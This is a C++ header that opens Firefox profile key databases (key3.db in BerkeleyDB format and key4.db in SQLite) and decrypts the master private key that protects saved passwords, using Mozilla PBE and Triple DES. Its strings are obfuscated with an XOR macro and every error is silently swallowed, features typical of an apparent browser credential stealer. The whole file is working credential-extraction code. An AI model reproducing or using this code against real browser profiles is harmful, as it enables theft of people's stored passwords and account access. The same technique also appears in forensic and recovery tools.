#pragma once
#include <string>
#include <vector>

#include "Asn1Der.h"
#include "BerkeleyDB.h"
#include "ByteHelper.h"
#include "MozillaPBE.h"
#include "PasswordCheck.h"
#include "TripleDesDecrypt.h"
#include "SqlHandler.h"

#include "xor.h"
#define XOR(x) XorStr(x)

using std::string;
using std::vector;

const static byte MagicNumber1[16] =
{
	248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1
};

class FireFoxBase
{
	static void ArrayCopy(const vector<byte> & src, int sourceIndex, vector<byte> & dest, int destIndex, int length)
	{
		try
		{
			while (length--) dest[destIndex++] = src[sourceIndex++];
		}
		catch (...) { return; }
	}

	static bool _memcmp(void* buffer1, void* buffer2, size_t size)
	{
		try
		{
			byte* buff1 = (byte*)buffer1;
			byte* buff2 = (byte*)buffer2;
			while (size--)
			{
				if (*buff1 != *buff2)
					return false;
				++buff1;
				++buff2;
			}
			return true;
		}
		catch (...) { return false; }
	}
public:
	static vector<byte> ExtractPrivateKey3(const string & file)
	{
		try
		{
			vector<byte> arr(24);
			Asn1Der asn1Der;

			bool b;
			BerkeleyDB berkeleyDB(file, b);
			if (!b)
				return vector<byte>();

			PasswordCheck passwordCheck(berkeleyDB.FindValue(XOR("password-check")));
			string hexString = berkeleyDB.FindValue(XOR("global-salt"));
			MozillaPBE pbe(ConvertHexStringToByteArray(hexString), vector<byte>(), ConvertHexStringToByteArray(passwordCheck.EntrySalt));
			pbe.Compute();
			string ps = TripleDes::DecryptAsString(pbe.Key, pbe.IV, ConvertHexStringToByteArray(passwordCheck.Passwordcheck));
			if (ps == XOR("password-check"))
			{
				string hexString2 = berkeleyDB.FindValue((byte*)MagicNumber1, 16);
				Asn1DerObject asn1DerObject = asn1Der.Parse(ConvertHexStringToByteArray(hexString2));
				pbe = MozillaPBE(ConvertHexStringToByteArray(hexString),
					vector<byte>(), asn1DerObject.objects[0].objects[0].objects[1].objects[0].Data);
				pbe.Compute();
				vector<byte> bytes;
				string ssbytes = TripleDes::DecryptAsString(pbe.Key, pbe.IV, asn1DerObject.objects[0].objects[1].Data);
				for (size_t i = 0; i < ssbytes.size(); ++i)
					bytes.push_back(ssbytes[i]);
				Asn1DerObject asn1DerObject3 = asn1Der.Parse(asn1Der.Parse(bytes).objects[0].objects[2].Data);
				if (asn1DerObject3.objects[0].objects[3].Data.size() > 24)
					ArrayCopy(asn1DerObject3.objects[0].objects[3].Data, asn1DerObject3.objects[0].objects[3].Data.size() - 24, arr, 0, 24);
				else
					arr = asn1DerObject3.objects[0].objects[3].Data;
			}
			return arr;
		}
		catch (...) { return vector<byte>(); }
	}

	static vector<byte> ExtractPrivateKey4(const string & file)
	{
		try
		{
			vector<byte> arr;
			bool b;
			SqlHandler sql(file, b);
			if (sql.ReadTable(XOR("metaData")) && b)
			{
				string value, value2;
				int rowCount = sql.GetRowCount();
				if (rowCount == 0)
					return vector<byte>();
				for (int i = 0; i < rowCount; ++i)
				{
					if (sql.GetValue(i, 0) == XOR("password"))
					{
						value = sql.GetValue(i, 1);
						value2 = sql.GetValue(i, 2);
						break;
					}
				}

				vector<byte> bt;
				for (char & ch : value2)
					bt.push_back(ch);
				Asn1Der asn1;
				Asn1DerObject asn1DerObject = asn1.Parse(bt);
				vector<byte> data = asn1DerObject.objects[0].objects[0].objects[1].objects[0].Data;
				vector<byte> data2 = asn1DerObject.objects[0].objects[1].Data;
				bt.clear();
				for (char & ch : value)
					bt.push_back(ch);
				MozillaPBE pbe(bt, vector<byte>(), data);
				pbe.Compute();
				string input = TripleDes::DecryptAsString(pbe.Key, pbe.IV, data2);
				if (input == XOR("password-check"))
				{
					if (sql.ReadTable(XOR("nssPrivate")))
					{
						rowCount = sql.GetRowCount();
						if (rowCount != 65536)
						{
							string s = "";
							for (int i = 0; i < rowCount; ++i)
							{
								const string value = sql.GetValue(i, 23);
								if (!value.empty())
								{
									bt.clear();
									for (char ch : value)
										bt.push_back(ch);
									if (/*!_memcmp(bt.data(), (void*)MagicNumber1, 16)*/ bt.size() == 16 && bt[0] == 248 && bt[bt.size() - 1] == 1)
									{
										s = sql.GetValue(i, 6);
										break;
									}
								}
							}
							bt.clear();
							for (char & ch : s)
								bt.push_back(ch);
							Asn1DerObject asn1DerObject2 = Asn1Der().Parse(bt);
							data = asn1DerObject2.objects[0].objects[0].objects[1].objects[0].Data;
							data2 = asn1DerObject2.objects[0].objects[1].Data;

							bt.clear();
							for (char & ch : value)
								bt.push_back(ch);
							pbe = MozillaPBE(bt, vector<byte>(), data);
							pbe.Compute();

							string res = TripleDes::DecryptAsString(pbe.Key, pbe.IV, data2);
							for (size_t i = 0; i < res.size(); ++i)
								arr.push_back(res[i]);
						}
					}
				}
			}

			return arr;
		}
		catch (...) { return vector<byte>(); }
	}
};